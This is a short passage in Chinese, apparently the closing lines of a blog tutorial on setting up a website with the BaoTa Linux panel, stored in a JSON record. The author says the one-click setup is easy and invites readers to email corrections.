教程就到这里了.其实没什么容易踩得坑，用宝塔linux比起网上的各种环境搭建简单太多了，这种一键建站萌新勇气来贼爽,大牛觉得有什么不对的地方可以发邮件“喷”我啊！嘤嘤嘤 邮箱：“masrerliu@gmail.com”","categories":[],"tags":[]}]